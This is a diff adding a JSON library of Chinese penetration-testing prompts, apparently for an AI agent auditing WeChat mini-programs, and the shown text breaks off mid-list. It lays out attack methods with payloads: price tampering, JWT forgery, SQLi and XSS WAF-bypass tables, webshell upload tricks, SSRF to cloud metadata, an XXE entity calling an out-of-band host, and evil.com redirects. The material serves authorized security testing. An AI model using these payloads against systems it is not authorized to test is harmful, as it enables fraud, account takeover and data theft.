@@ -1,0 +1,110 @@
+[
+  {
+    "name": "越权测试（IDOR/BOLA）",
+    "description": "对所有携带对象标识的接口执行系统性水平/垂直越权测试（OWASP API1）",
+    "prompt": "测试涉及「查看/修改/删除属于用户的数据」的功能点时，执行本越权方法论。\n\n【对象标识识别】从 get_http_captures 捕获的请求中找出所有对象引用：\n- URL 路径与查询参数：/orders/1042、?user_id=1001\n- 请求体字段：{\"addressId\":5}、{\"userId\":1001}\n- 编码标识：base64/hex 编码的 ID（先解码确认结构再改）\n- 云函数参数：call_cloud 的 data 中的 id 类字段\n优先测试敏感对象：订单/收货地址/发票/优惠券/工单/消息/简历。\n\n【水平越权标准流程】\n1. 用当前账号触发功能，get_http_captures 拿基准请求与响应（记下自己的数据）\n2. http_request 构造变体（自动带登录态与微信指纹）：\n- 直接替换：id=1042 → 1041/1040（相邻值优先）\n- 遍历探测：相邻 3-5 个 ID 各发一次，对比响应差异\n- 参数污染：?id=1042&id=1041；JSON 包装：{\"id\":[1041]}、{\"id\":{\"id\":1041}}\n- 同义字段：userId ↔ userid ↔ user_id；/api/User ↔ /api/user\n- 路径变体：尾斜杠 /、双斜杠 //、/./、%00 截断\n3. 判定：返回他人数据（与自己数据不同且结构一致）= 水平越权。\n403/空数据/无权限提示 = 已防护；返回 200 但数据为空不算，需用确定存在的 ID 复验。\n\n【垂直越权】\n- read_decompiled_file 找管理端接口命名：admin/、manage/、audit、xxxByUserId、getUserInfoByUsername，用普通账号登录态直接调用\n- set_page_data 改 isAdmin/role 后 UI 出现管理入口不算漏洞，必须证明对应后端接口普通身份调用也成功\n- 无需登录即可用订单号/手机号直查详情 = 未授权访问\n\n【误报排除】响应业务错误而非 4xx 时先对比原生请求差异（可能是风控软拦截）。\n发现即 add_board(type=vuln, title='水平越权-对象名', detail=接口+参数+证据对比)。",
+    "enabled": true
+  },
+  {
+    "name": "支付与交易逻辑测试",
+    "description": "下单/支付/退款/优惠券的价格篡改、字段联动试错、0元购与假支付测试",
+    "prompt": "遇到订单创建、支付、充值、兑换、退款类功能点时，执行本交易逻辑方法论。\n\n【价格篡改·逐字段试错法】\n1. capture_proxy(action='start') → 完整走一遍下单 → get_http_captures 找创建订单接口\n2. 请求带 sign：先删除 sign 重放（部分仅前端校验）；仍校验则改走 wx_request 逻辑层重放或 UI 模拟（tap/fill 走真实流程生成合法报文）。无 sign：http_request 直接篡改\n3. 一次只改一个字段，观察响应变化逐步逼近：\n- 价格 price/amount/fee → 0.01、0、0.001、负数 -1\n- 数量 count/num/quantity → 负数、0、超大值\n- 身份类型 passengerType/userType/level → 出现「价格不匹配」响应说明价格由类型决定，两字段需配套修改（如 passengerType=2 + ticketPrice=50 的儿童组合）\n- 套餐/舱位 seatId/packageId → 低价套餐 ID 配高价场景\n- 精度：555 → 0555、555 → 555.00（部分服务端只校验位数）\n4. 联动策略：当服务端校验「类型-价格」对应时，寻找它未校验的第三维度（如舱位等级）单独篡改\n\n【0元购】\n- 优惠券/积分抵扣字段（couponId/discount/points）→ 抵扣金额 > 订单金额\n- 免费额度类业务（如携童免费）伪造身份字段触发免费条件，下单后把身份改回自己\n\n【支付状态】\n- 找支付结果查询/回调接口，篡改 payStatus/status 测试假支付\n- 改价格下单 → 真实支付 0.01 → 观察订单是否变已支付\n\n【退款】退款金额篡改、已退款订单重复申请（配合竞态 skill）。\n判定以订单实际状态变化为准；add_board(type=vuln) 记录完整证据链：原始包 → 篡改包 → 订单状态。",
+    "enabled": true
+  },
+  {
+    "name": "竞态条件利用",
+    "description": "签到/领券/抽奖/提现等次数余额限制类业务的并发重放超额获利",
+    "prompt": "对「执行一次就消耗额度」的业务（签到、领券、抽奖、投票、提现、秒杀名额）测竞态。\n\n【流程】\n1. get_http_captures 定位消耗额度的请求（如 /coupon/receive）\n2. 先发 1 次确认正常成功；再连发 2 次被拦截 = 有次数校验，值得测竞态\n3. concurrent_request(url, method, body, count=10~20) 并发重放（自动带登录态）：\n- 并发同时到达，穿过「校验-扣减」间隙\n- count 从 10 起，全败试 30-50；仍全败可能有锁，换接口\n4. 判定：查询余额/券列表确认多到账（并发 10 成功 ≥3 即竞态漏洞）；\n响应全成功但余额只加 1 = 服务端有锁，不是漏洞\n\n【变体】\n- TOCTOU：并发的同时用另一请求修改对象归属/状态，利用检查与使用之间的时间差\n- 跨接口：提现并发 + 余额轮询，观察是否多打款\n- 限流窗口：部分校验基于「上次请求时间」，间隔 1 秒内重放探测阈值\n\n【注意】并发对业务有真实影响，仅在授权范围内；add_board(type=vuln) 记录成功笔数与到账证据。",
+    "enabled": true
+  },
+  {
+    "name": "认证与会话安全测试",
+    "description": "登录逻辑、短信验证码轰炸/绕过、JWT 弱点、会话管理缺陷测试",
+    "prompt": "涉及登录/注册/找回密码/验证码功能点时，执行本认证安全方法论。\n\n【短信验证码接口】\n1. get_http_captures 抓发送验证码请求\n2. 发送限制绕过（响应成功且手机收到 = 短信轰炸）：\n- 号码混淆：+86 前缀、前加空格/%20、0 前缀\n- 多号复用：phone=138x,139x、phone=138x&phone=139x、数组 [\"138x\",\"139x\"]\n3. 验证码缺陷：4/6 位数字验证码 concurrent_request 并发猜解（先确认无错误锁定）；\n响应包直接回显验证码；同一验证码可复用登录\n\n【JWT/token】\n1. get_credentials 取 token，base64 解码 payload 看 user_id/role\n2. none 算法：alg 改 none 删签名；payload 中 user_id 改他人直接发（后端若信 payload 即越权）\n3. 弱密钥签名伪造\n\n【登录逻辑】\n- read_decompiled_file 审计登录模块：硬编码账号密码、md5 密文直传接口\n- 未授权接口拿到 md5 密文无需破解可直接登录\n- 错误次数锁定测试：锁定后换 UA/指纹是否重置\n- 短信登录改 phone 参数验证码不变 → 自己手机号收码登录他人账号\n\n【会话】退出后旧 token 重放（http_request）仍可用 = 会话未失效；多端登录互踢；token 长期有效。\n发现即 add_board(type=vuln) 记录。",
+    "enabled": true
+  },
+  {
+    "name": "云函数与微信开放能力",
+    "description": "云函数鉴权绕过、openid/CloudID 伪造、AppSecret 泄露利用链",
+    "prompt": "小程序使用 wx.cloud 或出现 AppSecret/商户号泄露时，执行本微信特有攻击面方法论。\n\n【云函数鉴权测试】\n1. capture_cloud 开启 → 操作业务 → get_cloud_calls 看全部云函数调用\n2. static_scan + read_decompiled_file 提取云函数名清单（重点 user/admin/order/pay/get/update/delete 命名）\n3. call_cloud 直接调用测试：\n- 未鉴权：不带身份参数直接调，返回数据 = 云函数未校验调用者\n- 身份伪造：data 传 openid:'受害者openid' —— 云函数若用 event.openid 而非 cloud.getWXContext().OPENID 判身份即可冒充他人\n- CloudID 伪造：构造 {\"xxxClooudID\":{\"cloudID\":\"x\",\"data\":{\"phoneNumber\":\"伪造值\"}}} 传给消费开放数据的云函数，云函数直接读 e.xxx.data 即被伪造（正确实现应校验 OPEN_DATA_INFO）\n4. 判定：响应含他人数据/敏感操作成功\n\n【AppSecret 泄露利用】\n1. scan_sensitive 命中 AppSecret → read_decompiled_file 确认 AppID+Secret 配对上下文\n2. 危害验证（授权范围内）：\n- GET https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=X&secret=Y 取接口凭证\n- 凭证可发客服消息（钓鱼）、获取用户手机号、生成小程序码 = 接管服务端能力\n3. 报告写明：泄露位置 + 验证方式 + 影响面\n\n云函数漏洞 add_board(type=vuln) 注明函数名与伪造参数。",
+    "enabled": true
+  },
+  {
+    "name": "未授权接口挖掘",
+    "description": "从反编译源码提取接口清单，批量测试鉴权缺失与隐藏管理接口",
+    "prompt": "阶段一完成后对接口面做深度覆盖时，执行本未授权接口挖掘方法论。\n\n【接口清单构建】\n1. read_decompiled_file 遍历定位网络层：app-service.js、services/、api/、request.js、http.js、config.js、app-config.json\n2. 提取接口路径：\n- baseUrl/host/apiPrefix 常量附近的字符串拼接\n- 高危动词命名：getUserInfo、queryXxxByOpenid、listAll、exportXxx、downloadFile\n- 配置文件里的后台路由表\n3. 与 get_http_captures 动态捕获交叉：源码有但从未被调用的接口 = 隐藏接口（管理端/内部接口），优先测试\n\n【鉴权缺失批量验证】\n1. 无登录态直连：http_request 不带 Cookie/Authorization 调 GET 类接口，返回业务数据（非 401/403）= 未授权访问\n2. 弱鉴权：带任意伪造 token（Bearer test）返回 200 = 鉴权形同虚设\n3. 高危接口优先 + 分页放大（pageSize=1000）：export/getAll/getUserList/queryByPhone 类\n\n【信息泄露审计】返回体中手机号/身份证/银行卡明文 = 敏感信息泄露；\n接口给全号而前端才打码 = 后端泄露漏洞（前端打码不算防护）。\n\n【误报排除】公开数据接口（商品/文章）不算未授权；需签名但未校验签名有效性的接口注明「签名可伪造」。\n发现 add_board(type=vuln, detail=接口+无凭证请求响应证据)。",
+    "enabled": true
+  },
+  {
+    "name": "前端鉴权与状态篡改",
+    "description": "识别仅前端控制的权限/业务限制，用逻辑层工具篡改状态并协议层验证",
+    "prompt": "遇到 VIP 功能、会员内容、管理入口、按钮置灰、次数限制等前端控制场景时，执行本方法论。\n核心原则：UI 隐藏/置灰不是访问控制，必须证明后端同样不设防。\n\n【标准测试链】\n1. get_page_state 看当前页 data：找 isAdmin/isVip/vipLevel/hasPermission/showXxx 等权限字段\n2. set_page_data 篡改（isVip=true、vipLevel=9）→ 观察 UI 是否解锁新入口/内容\n3. 关键判定——对解锁后的功能发起真实请求：\n- UI 解锁且接口正常返回数据 = 完整漏洞（前后端双缺失）\n- UI 解锁但接口 403 = 纯前端展示问题（低危）\n- 接口无需改 UI 直接可调 = 后端裸奔（http_request 直测）\n4. globalData 层：get_app_data 看 userInfo/role 权限缓存；wx_request 在逻辑层以篡改身份发请求（绕过渲染层限制）\n\n【业务限制绕过】\n- 次数存本地（storage/pageData）→ set_page_data 或 replay_api 篡改剩余次数\n- 表单校验仅前端 → http_request 直接构造提交（跳过协议同意、畸形数据）\n- AB 实验/灰度开关（get_app_data 的 flag）强制打开未上线功能\n\n【验证铁律】每次状态篡改后必须 get_http_captures/http_request 确认服务端真实行为；只有 UI 变化没有接口数据返回 = 证据不足，不报漏洞（双通道互相印证）。\nadd_board(type=vuln) 记录：篡改字段 + 服务端响应证据。",
+    "enabled": true
+  },
+  {
+    "name": "SQL注入与注入类漏洞",
+    "description": "小程序 API 的 SQLi/命令注入/模板注入测试：JSON 体注入、报错探测、时间盲注、样本即停",
+    "prompt": "对带查询/筛选/排序/搜索参数的接口测注入类漏洞。\n\n【入口识别】\n- get_http_captures 找携带用户输入进查询的参数：keyword、search、orderBy、filter、id\n- read_decompiled_file 确认后端栈：报错页特征、SDK 字符串（Java+MyBatis/PHP+ThinkPHP/Python+Django）→ 决定 payload 方言\n\n【JSON 体注入】小程序接口多为 JSON：\n- 字符串位：{\"keyword\":\"x'\"}、\"x\\\"\"、\"x' OR '1'='1\"\n- 数字位：{\"id\":\"1 OR 1=1\"}（字符串型数字位最易漏防）\n- 排序位注入：orderBy=id → orderBy=(SELECT 1)、orderBy=id;--\n- 二阶注入：注册昵称/收货人存 payload，在后台展示或导出处触发\n\n【探测与确认】\n1. 报错探测：单双引号、%27 反编码、')[' 不平衡括号 → 响应含 SQL 报错即存在\n2. 布尔盲注：id=1 AND 1=1 vs id=1 AND 1=2 对比响应差异（内容/长度/状态码）\n3. 时间盲注：MySQL sleep(3)、PostgreSQL pg_sleep(3)、MSSQL waitfor delay'0:0:3'，响应延迟 ≥ 基准 3 秒且重复 2 次稳定\n4. 无回显可试 wx_request 逻辑层重放绕过前端编码\n\n【命令/模板注入】\n- 导出/文件名/渲染类参数：|id、`id`、$(id)、{{7*7}}、${7*7}\n- 验证以响应回显或明确时间差为准，不执行破坏性命令\n\n【样本控制】确认存在即停：拿到 DB 名/版本/字段数即够报告，不 dump 数据（见红线 skill）。\nWAF 拦截时记录拦截特征，注入变体（大小写/注释/编码）最多试 3 轮，不硬耗。\nadd_board(type=vuln, detail=参数+payload+差异化证据)。",
+    "enabled": true
+  },
+  {
+    "name": "SSRF 与 URL 资源加载",
+    "description": "头像/导入/webhook/富文本图片等 URL 参数的 SSRF 测试与危害验证",
+    "prompt": "接口中出现「服务端代为请求 URL」的场景测 SSRF。\n\n【入口识别】\n- get_http_captures 找 URL 类参数：avatarUrl、fileUrl、callbackUrl、webhook、importUrl、cover、preview\n- 典型场景：上传头像（服务端转存）、文件导入、富文本图片拉取、消息推送回调、分享卡片封面\n- read_decompiled_file 搜 upload/download/fetch/pull 类接口定义\n\n【测试梯度】\n1. 探测回显：URL 指向受控点（自己的测试服务器/可回显服务），看响应或内容回显\n2. 无回显时用时间差与状态差异判断：可解析域名 vs 不可解析域名的响应差异\n3. 内网探测（谨慎、少量）：仅验证可达性，如 127.0.0.1:8080、10.0.0.1 各发 1 次，看响应差异，不批量扫内网\n4. file://、dict://、gopher:// 协议试探各 1 次，有回显即可证明\n\n【危害验证】\n- 证明能打到内网服务 banner（如 Nacos/ES 的版本响应）即足量\n- 云元数据仅试 169.254.169.254 一次验证可达性，拿到了也不深入利用\n\n【变体】IP 表示法（0x7f000001、2130706433）、DNS 重绑记录为线索不实施。\n样本控制：不建隧道、不做内网横移。\nadd_board(type=vuln, detail=入口参数+可达证据+影响描述)。",
+    "enabled": true
+  },
+  {
+    "name": "信息泄露与国产组件暴露面",
+    "description": "API 域上的 Actuator/Druid/Nacos/Swagger 等组件暴露、报错泄露、备份文件、sourcemap 泄露",
+    "prompt": "对小程序 API 域名与关联资产执行组件暴露面检查（国内后端高频问题）。\n\n【高危路径清单】对 API 域逐个 GET（http_request，无登录态）：\n- Spring Boot Actuator：/actuator、/actuator/env、/actuator/heapdump、/actuator/mappings、/actuator/configprops\n- Druid 监控：/druid/index.html、/druid/login.html（默认凭据 admin/admin 最多试 2 组常见组合）\n- Nacos：/nacos/（默认 nacos/nacos）、/nacos/v1/auth/users?pageNo=1&pageSize=9\n- Swagger/Knife4j：/swagger-ui.html、/v2/api-docs、/doc.html、/v3/api-docs\n- Eureka：/eureka/apps\n- 备份与调试（按命中率优先）：/backup.zip、/www.zip、/web.rar、/{域名}.zip、/backup.sql、/db.sql、/dump.sql、/.git/config、/.git/HEAD、/.svn/entries、/.svn/wc.db、/.env、/.env.bak、/config.php.bak、/phpinfo.php、/test.php、/debug.log、/phpmyadmin/、/adminer.php\n\n【判定】\n- Actuator /env 含 spring.datasource.password=*** 时配合 /actuator/heapdump（仅下载后本地检索关键字证明可获取，不深挖）\n- Swagger 全量接口列表泄露本身=中危；结合「未授权接口挖掘」skill 测其中敏感接口\n- 组件页面能打开但需登录 = 记录为暴露面线索；无需登录可操作 = 漏洞\n\n【报错与响应泄露】\n- 故意传畸形参数触发 500，看堆栈泄露（框架/版本/SQL/内网 IP）\n- get_http_captures 检查响应头：Server、X-Powered-By、Set-Cookie 缺 HttpOnly\n\n【小程序包内泄露】\n- static_scan + scan_sensitive：AppSecret、AK/SK、OSS 凭证、高德/极光等三方 key\n- read_decompiled_file 查 .map 文件引用（sourcemap 可还原源码）\n\n每条发现 add_board(type=vuln)，泄露内容截图脱敏（红线 skill）。",
+    "enabled": true
+  },
+  {
+    "name": "Mass Assignment 批量赋值",
+    "description": "注册/资料/下单接口冗余字段注入 isAdmin/role/price 类字段被服务端接受即中招",
+    "prompt": "对创建/更新类接口（注册、改资料、下单、改地址）测参数批量赋值漏洞。\n\n【原理】服务端用请求体直接绑定 ORM 实体，客户端多传的字段被「好心」赋值。\n\n【测试流程】\n1. get_http_captures 找 POST/PUT 创建/更新接口，观察请求体字段结构（框架会回显完整实体字段名风格）\n2. http_request 重发原请求，附加特权/价格字段（一次一批，观察哪个被接受）：\n- 身份类：isAdmin:true、role:\"admin\"、userType:1、level:9、vip:true、verified:true、status:1\n- 价格类（下单/充值）：price:0.01、discount:100、amount:0、totalFee:0\n- 审核类：auditStatus:1、isAuth:true、checkStatus:2\n3. 判定：\n- 请求 200 且 get_page_state/get_app_data 或重新查询显示身份/价格生效 = 漏洞成立\n- 200 但字段被忽略 = 已防护（实体白名单/DTO）\n- 400/参数错误 = 有校验\n4. 下单接口价格字段生效时，配合真实 0.01 元最小订单验证（红线 skill）\n\n【变体】\n- 字段名风格跟随原请求：原 camelCase 试 camelCase 与 snake_case 两套\n- 嵌套实体：{\"user\":{\"role\":\"admin\"}}、{\"profile.role\":\"admin\"}\n- JSON 数组/对象包裹：{\"role\":[\"admin\"]}\n\n【与前端篡改 skill 区分】mass assignment 是「多塞字段」，前端鉴权篡改是「改已有字段」；两者可链式组合提高影响。\nadd_board(type=vuln, detail=注入字段+生效证据)。",
+    "enabled": true
+  },
+  {
+    "name": "报告定级与证据链",
+    "description": "CVSS 3.1 定级、链式漏洞合并定级、影响导向的报告写法与证据规范",
+    "prompt": "撰写渗透报告（generate_report）与画板记录时遵循本方法论。\n\n【定级（CVSS 3.1 思维，以影响为主轴）】\n- 严重：可直接获利的支付绕过/0元购、全量用户数据未授权访问、AppSecret+资金能力、管理接口完全暴露\n- 高危：水平越权读写他人核心数据、云函数身份伪造、批量手机号泄露、竞态超额获利\n- 中危：越权只读非核心数据、Swagger 全暴露、反射 XSS（webview）、签名可伪造但未造成直接获利\n- 低危：信息泄露（版本/路径）、纯前端展示问题、自XSS\n- 有链路加成：信息泄露 → 越权 → 获利，按合并链最高影响定级，链条写明\n\n【证据链规范】每条漏洞四段式：\n1. 位置：接口 URL + 参数 + 触发页面\n2. 复现步骤：编号步骤，每步附请求要点（方法/路径/关键参数），可被他人独立复现\n3. 证据：请求与响应关键片段（PII 已脱敏）+ 业务状态变化（余额/订单/身份）\n4. 影响：从业务视角一句话说清危害（「攻击者可 X 从而 Y」），不堆砌技术细节\n\n【影响升级五维法】定级前对每条漏洞过五维，用「最小数据证明、描述最大后果」提升报告质量（不增加测试破坏性）：\n1. 影响对象：单用户/多用户/全体用户/跨租户？资金/权限/文件/隐私？自问「对所有用户利用会影响多少人」\n2. 可扩展性：能脚本自动化批量吗？有限流拦得住吗？可枚举=影响放大\n3. 可持续性：token 可复用？链接永久有效？无撤销机制？受害者无感知？\n4. 组合路径：以此漏洞为跳板下一步能到哪？（只用已确认的链证据，不臆想）\n5. 业务语境：直接资金损失/合规处罚/上新闻的头条是什么？\n\n【单接口全量规则】一个请求不经遍历直接返回全部用户数据（如 getuserlist）→ 起步高危，含 PII（手机/身份证/住址）升级严重；这比需遍历的单资源越权严重一个档次。\n\n【写法要求】\n- 标题格式：「漏洞类型-对象-影响」，如「水平越权-订单接口-任意用户订单信息查看」\n- 影响优先：先说能造成什么损失，再讲技术细节\n- 修复建议必须给：鉴权加服务端会话比对、金额服务端计算、验证码限频等具体方案\n\n【一致性检查】报告中的每条漏洞必须能在渗透画板找到对应记录；画板中的 note 类线索不得混入漏洞列表。",
+    "enabled": true
+  },
+  {
+    "name": "多端攻击链与鉴权不一致",
+    "description": "同 API 多端鉴权差异、client-type 信任滥用、版本降级、小程序 token 横用 Web、API 镜像（多端最高 ROI）",
+    "prompt": "小程序常与 Web/APP 共享后端但各端鉴权强度不同。测试完小程序单点后，执行本多端攻击链方法论。\n\n【多端鉴权不一致（最高 ROI）】\n1. 从反编译源码与 get_http_captures 列出小程序调用的 API 清单\n2. 对每个 API 回答：同一接口在 Web 端是否存在？鉴权是否一致？\n- 小程序带 token 调用 200，Web 端同接口无鉴权直调也 200 = 鉴权只在一端生效\n- 用 http_request 分别以「无 token / 伪造 token / 小程序 token」三态调用，对比响应\n\n【client-type 信任滥用】\n1. read_decompiled_file + get_http_captures 找客户端身份标识参数：platform、clientType、device、from、source、channel、version、apiVersion\n2. http_request 篡改：platform:\"miniprogram\" → platform:\"admin\"、version:\"2.1.0\" → \"1.0.0\"（服务端若按此字段分支授权/走旧逻辑即中招）\n\n【版本降级攻击】\n- 现版本接口有鉴权 → 试 /api/v1/、/api/v2/ 旧版本、无版本前缀的遗留路径、X-API-Version 头降版本\n- 旧版本常停在「无鉴权/弱鉴权」时代，源码里出现过的 v1 路径全部实测\n\n【Token 横用（跨端复用）】\n- get_credentials 取小程序 token → 当作 Web 端 Authorization/Cookie 调 Web 接口：同权限=共享会话（一端泄露全端沦陷）；Web 端权限更大=升级链\n\n【API 镜像】\n- 小程序发现隐藏接口 /api/mp/internal/config → 镜像路径试 /api/web/internal/config、/api/internal/config（同后端不同前缀常同漏洞）\n\n【升级链示例】小程序源码硬编码 admin API key → Web 管理端接管；小程序接口响应泄露 userId/token → Web IDOR。\n发现即 add_board(type=vuln)，注明「多端不一致」类型与两端证据对比。",
+    "enabled": true
+  },
+  {
+    "name": "工作流滥用与状态机测试",
+    "description": "业务流程跳步、订单状态回退、webhook 伪造、验证步骤绕过、限流绕过（XFF 轮换）",
+    "prompt": "对多步骤业务流程（注册认证、下单支付、充值提现、审核、找回密码）执行工作流滥用测试。\n\n【流程跳步】\n1. capture_proxy 完整走一遍流程，记录每一步请求序列\n2. 跳过中间步骤：直接调最终步骤接口；步骤 1 → 步骤 3（跳过 2）；\n- 邮箱/实名/CAPTCHA 验证环节：跳过验证直接调验证后才能调的接口（如直接调 /monitoring/enable 而不做验证）= 验证仅 UI 层\n3. 验证 token 跨账号复用：A 账号的验证 token 给 B 账号的验证接口用\n\n【状态机滥用】\n- 枚举订单/工单状态流转，尝试非法跳转：待支付 → 直接改已完成（PATCH status）；已完成 → 回退待支付后重新触发优惠\n- 重复执行不可重复步骤：已核销的券再核销、已退款订单再退款\n- get_http_captures 对比正常状态字段值（status/payState/orderState 的枚举值），http_request 遍历非法值\n\n【支付回调伪造】\n- 源码/流量中找支付回调端点（notify/callback/webhook）\n- 无签名直接 POST 伪造成功报文；有签名字段先试空值/原样重放（测防重放幂等）；\n- 重放未修改的原始回调 2 次看是否重复入账 = 缺幂等\n\n【限流绕过】\n- 对被限频接口轮换 X-Forwarded-For/X-Real-IP/True-Client-IP（每请求换 IP）\n- Cookie 清除/换账号/换 UA 对比限流维度；响应头带 X-RateLimit 观察重置窗口\n- 短信/邮件发送接口优先测（配合红线：只对测试手机号）\n\n【Gate 0 三问】每条发现自问：攻击者现在能做什么（具体）？受害者损失什么（具体）？从零 10 分钟内可复现吗？三问不过不记录。\nadd_board(type=vuln) 附完整请求序列与状态变化证据。",
+    "enabled": true
+  },
+  {
+    "name": "WAF与过滤绕过决策树",
+    "description": "Payload 被拦后的系统化绕过：解析差异三问、SQLi/XSS 分维度绕过表、编码层逃逸",
+    "prompt": "任何 payload 被拦截（WAF/过滤/业务校验）时，按本决策树系统化绕过，不盲目换 payload。\n\n【拦截分析三问】\nQ1 防护组件与后端解析是否一致（前置 WAF vs 源站框架）？→ WAF 拦走协议层（HPP/Chunked/大小写/Content-Type 变体），应用拦走编码/语义层\nQ2 防护是否覆盖所有 corner case？→ 双编码、混合大小写、超长填充\nQ3 防护是否覆盖所有入口？→ Header/Cookie/HPP/非常规参数位注入\n先看拦截响应特征判断是 WAF（统一拦截页）还是应用（业务报错），再选维度。\n\n【SQLi 绕过表】\n- 关键字：大小写 UnIoN SeLeCt；双写 UNunionION SELselectECT；注释插入 un/**/ion；MySQL 内联注释 /*!50000union*/；|| 代 OR、&& 代 AND；LIKE/REGEXP/IN/BETWEEN 代等号；mid/substr/left 互换\n- 空格：/**/、%09、%0a、%0d、括号嵌套 select(user)from(dual)、URL 位用 +\n- 引号：0x hex 字面量、char()、GBK 宽字节 %df%27\n- 数字型免引号：id=1 AND 1=1 直接可用\n- sleep 被禁：双层延时 (select(2)from(select(sleep(8)))v)、CASE WHEN 条件延时；MSSQL WAITFOR DELAY\n\n【XSS 绕过表】\n- 标签：<script/x>、<svg/onload>、<details open ontoggle>、<input autofocus onfocus>、罕见事件 onanimationend/ontouchstart/onauxclick（越罕见越能过 WAF）\n- 括号：alert`1` 模板字符串、throw onerror=alert,1、Function 构造器、String.fromCharCode\n- 上下文逃逸：HTML 实体 &#x3c;、JS 字符串位用 Unicode 转义、URL 位 data:/base64\n\n【协议层】\n- 参数污染 HPP：?id=1&id=10086（WAF 取第一个、后端取最后一个）\n- Content-Type 变换：json → form → text/plain（路由与解析差异）\n- 方法覆盖：X-HTTP-Method-Override 头\n\n【纪律】每维度最多 3 轮变体，绕不过记录拦截特征后换入口（如 wx_request 逻辑层路径），不硬耗；绕过成功 add_board 的 detail 里注明绕过手法（这是独立于漏洞本身的加分发现）。",
+    "enabled": true
+  },
+  {
+    "name": "签名与加密参数逆向",
+    "description": "从反编译源码定位 sign/enc 算法与盐值，伪造合法签名让篡改请求通过校验，打通所有重放测试",
+    "prompt": "当请求带 sign/signature/token 校验导致 http_request 篡改被拒时，执行本逆向方法论。这是打通支付/越权等所有测试的前置能力。\n\n【定位签名算法】\n1. read_decompiled_file 按优先级搜：\n- 关键词：sign、signature、_nonce、timestamp、md5、sha、hmac、aes、encrypt、secret、salt\n- 请求封装层：request.js/http.js/utils/ 下的拦截器函数\n- 常见模式：md5(参数排序拼接 + salt)、hmac-sha256(key, body)、自定义异或/移位\n2. 确认四要素：参与签名的字段（全部参数还是白名单字段）、拼接顺序（按 key 排序？）、算法、盐/key 位置（硬编码 / 服务端下发 / 设备相关）\n\n【判定可伪造性】\n- 盐硬编码在源码 = 签名完全可伪造（本身也是中危泄露）\n- key 来自登录响应 = 拿到即任意伪造\n- key 与设备/时间强绑定 = 评估重放窗口（timestamp ±300s 常见）\n\n【利用路径】\n1. 伪造签名：用源码算法手动构造（http_request 发送完整伪造包）\n2. 不可伪造时的替代通道：\n- wx_request 逻辑层重放：走小程序自身网络栈，签名由原逻辑生成，仅改业务字段（改不到签名字段时最实用）\n- replay_api 原样重放：测防重放/幂等\n- set_page_data/tap 改页面状态后走真实 UI 流程生成合法报文\n3. 时间戳重放窗口：原包捕获后 5-10 分钟内重放，测服务端是否真校验时效\n\n【加固判断】签名校验返回固定错误码 vs 静默忽略（部分接口只验签名字段存在性——删掉 sign 仍成功=形同虚设，直接记录）。\n发现盐硬编码/弱签名 add_board(type=vuln)；签名打通后回填到支付/越权/工作流各 skill 的测试链。",
+    "enabled": true
+  },
+  {
+    "name": "文件上传漏洞",
+    "description": "头像/附件/导入功能的上传绕过：扩展名与MIME绕过、magic bytes、路径遍历、解析漏洞、DOCX/Excel XXE、上传 XSS",
+    "prompt": "对头像、附件、客服图片、Excel 导入、文件导出等上传/导入功能执行本方法论。\n\n【入口识别】\n- get_http_captures 找 multipart/form-data 或 base64 上传请求（file/image/avatar/attachment 字段）\n- read_decompiled_file 找 wx.chooseMessageFile/chooseImage/uploadFile 调用点，确认前端类型限制（仅为前端校验则必绕）\n- 记录上传响应中的文件回显 URL 与存储路径结构\n\n【绕过测试梯度】\n1. 前端绕过：小程序前端限制用 http_request 直接发上传包绕过\n2. 扩展名绕过（按后端栈选）：\n- 双扩展：shell.php.jpg（只查最后扩展名时）、test.jpg.php\n- 大小写：shell.PhP、shell.pHp\n- 可执行后缀清单：php(3/4/5/phtml/pht)、jsp/jspx/jspf、asp/aspx/asa/cer/ashx、war\n- 配置文件：.htaccess（AddType application/x-httpd-php .jpg）、.user.ini、web.config\n3. Content-Type 伪装：application/octet-stream → image/jpeg（只查 MIME 时）\n4. magic bytes：GIF89a<?php ...、PNG 头 \\x89PNG\\r\\n\\x1a\\n + PHP；图片马配合解析漏洞\n5. 文件名注入：\n- 路径遍历：filename=\"../../shell.php\"、..\\..\\shell.php（Windows 栈）\n- 截断与解析：shell.asp;.jpg（IIS 分号）、shell.jpg%00.php（老 Nginx）、shell.php.（尾点/尾空格，Windows）\n- 空文件名/超长文件名/特殊字符试探存储逻辑\n\n【判定关键——回显与可解析】\n1. 上传响应或对象存储 URL 确认文件落盘路径\n2. 访问回显 URL：原样返回内容 = 存储/解析为静态（ php 代码不执行 → 降级）\n3. 可解析（执行）= 高危 RCE；不可解析但可控 Content-Type/HTML = 存储型 XSS（上传 .html/.svg）\n4. OSS/云存储场景：测试上传桶权限（能否列目录）、文件覆盖（同名上传他人文件）、HTML 直开（Content-Disposition 缺失）\n\n【导入类 XXE】Excel/DOCX 导入接口：构造带外部实体 DOCTYPE 的 xlsx/docx（[Content_Types].xml 或 sheet 内 XML 塞 <!ENTITY xxe SYSTEM \"http://OOB地址\">），配合受控回显地址确认 OOB 连接（盲打必须 OOB 证实，不证实不报）。\n\n【覆盖与竞争】\n- 同名覆盖：上传 1.jpg 两次内容不同，看是否覆盖他人文件（先传自己占位确认 URL 规律）\n- 竞争：上传服务端「校验后删除」的文件时，concurrent_request 上传+访问竞速（仅 2-3 轮，红线控制）\n\n【样本控制】验证 RCE 用 id/whoami 最小命令即停，不部署常驻 shell（红线）；删除测试上传文件。\nadd_board(type=vuln, detail=绕过手法+落盘URL+执行/解析证据)。",
+    "enabled": true
+  },
+  {
+    "name": "开放重定向",
+    "description": "redirect/next/callback 类参数的任意跳转、协议相对与@混淆绕过、链式升级 OAuth 钓鱼",
+    "prompt": "对带跳转参数的接口与页面执行本方法论。单跳转本身低危，价值在链式升级（OAuth 盗号/钓鱼）。\n\n【入口识别】\n- get_http_captures 找跳转参数：redirect、next、url、return、returnTo、continue、dest、go、forward、target、redir、callback、redirect_uri、success_url、cancel_url、jump\n- 典型位：登录后跳转、分享落地页、支付成功/取消页、退出登录、企业网站授权、客服消息链接\n- read_decompiled_file 搜 navigateTo/redirectTo/Location/302 相关拼接逻辑\n\n【测试流程】\n1. 基础验证：参数值改 https://evil.com 或 //evil.com，看响应 302 Location 或前端 window.location 跳转\n2. 绕过表（逐条试）：\n- 协议相对：//evil.com（只拦 http:// 前缀白名单时）\n- 反斜杠：/\\evil.com、/\\/evil.com（部分解析器视 \\ 为 /）\n- @混淆：https://target.com@evil.com（@前被当作用户信息）\n- 子域混淆：https://target.com.evil.com；碎片：https://evil.com#.target.com\n- 编码：%2F%2Fevil.com、双重编码 %252F、%00 截断 evil.com%00、%09/%20 空白符\n- 